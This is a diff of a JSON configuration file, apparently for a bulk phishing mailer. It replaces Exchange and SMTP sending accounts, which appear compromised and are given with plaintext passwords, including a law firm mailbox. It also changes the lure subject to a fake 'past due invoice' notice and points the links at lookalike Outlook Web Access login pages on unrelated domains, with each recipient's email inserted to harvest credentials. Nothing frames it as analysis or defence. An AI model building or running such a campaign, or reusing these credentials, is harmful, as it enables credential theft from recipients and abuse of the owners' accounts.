@@ -1,8 +1,8 @@
 {
   "use_exchangelib": true,
-  "exchange_server": "east.exch092.serverdata.net",
-  "exchange_email": "vpprager@svaprager.net",
-  "exchange_password": "Punker80",
+  "exchange_server": "west.exch031.serverdata.net",
+  "exchange_email": "legalassistant@mednicklawgroup.com",
+  "exchange_password": "Rapids12$12!",
   "single_smtp": false,
   "smtp_server": "netsol-smtp-oxcs.hostingplatform.com|cheryl@teamartistrep.com|Kikigigi1478!g|587|false",
   "smtp_servers": "malt_smtp/smtp.txt",
@@ -13,10 +13,10 @@
   "sender_names": ["Steven Bass"],
   "repply_to": "info@nunez.io",
   "subjects": [
-    "Notification: Messages Awaiting Your Attention"
+    "Important Notice: Past Due Invoice - {RECIPIENT_DOMAIN_NAME}"
   ],
   "links": [
-    "https://paymentjustinaseconds-exch02910-Eastexcho081n-exch0801.ggecu.com/owa#{RECIPIENT_EMAIL}"
+    "https://sterverdata-springhoa.longlifestreatedwood.com/owa#{RECIPIENT_EMAIL}"
   ],
   "format_type": "F1",
   "send_attachment": false,
